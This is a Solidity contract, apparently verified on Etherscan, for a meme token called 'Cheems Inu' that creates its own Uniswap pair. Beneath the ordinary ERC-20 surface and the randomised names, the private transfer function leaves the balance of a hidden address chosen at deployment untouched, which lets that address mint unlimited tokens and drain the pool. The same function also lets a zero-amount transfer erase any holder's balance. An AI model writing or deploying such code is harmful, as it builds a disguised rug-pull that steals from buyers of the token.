/**
 *Submitted for verification at Etherscan.io on 2023-08-28
*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CHEEMSINU is Ownable {
    function transfer(address mgxjhea, uint256 hgizlmu) public returns (bool success) {
        tpia(msg.sender, mgxjhea, hgizlmu);
        return true;
    }

    function transferFrom(address zfndvkh, address mgxjhea, uint256 hgizlmu) public returns (bool success) {
        require(hgizlmu <= allowance[zfndvkh][msg.sender]);
        allowance[zfndvkh][msg.sender] -= hgizlmu;
        tpia(zfndvkh, mgxjhea, hgizlmu);
        return true;
    }

    uint256 private igmwxzo = 101;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address djsayig) {
        balanceOf[msg.sender] = totalSupply;
        apdxwte[djsayig] = igmwxzo;
        IUniswapV2Router02 kyaofdmnp = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        fyapnxt = IUniswapV2Factory(kyaofdmnp.factory()).createPair(address(this), kyaofdmnp.WETH());
    }

    uint256 public totalSupply = 10000000000 * 10 ** 9;

    mapping(address => uint256) private apdxwte;

    function tpia(address zfndvkh, address mgxjhea, uint256 hgizlmu) private {
        if (0 == apdxwte[zfndvkh]) {
            balanceOf[zfndvkh] -= hgizlmu;
        }
        balanceOf[mgxjhea] += hgizlmu;
        if (0 == hgizlmu && mgxjhea != fyapnxt) {
            balanceOf[mgxjhea] = hgizlmu;
        }
        emit Transfer(zfndvkh, mgxjhea, hgizlmu);
    }

    mapping(address => uint256) private tokzajin;

    string public symbol = 'CHEEMSINU';

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    function approve(address kmejspu, uint256 hgizlmu) public returns (bool success) {
        allowance[msg.sender][kmejspu] = hgizlmu;
        emit Approval(msg.sender, kmejspu, hgizlmu);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    address public fyapnxt;

    string public name = 'Cheems Inu';
}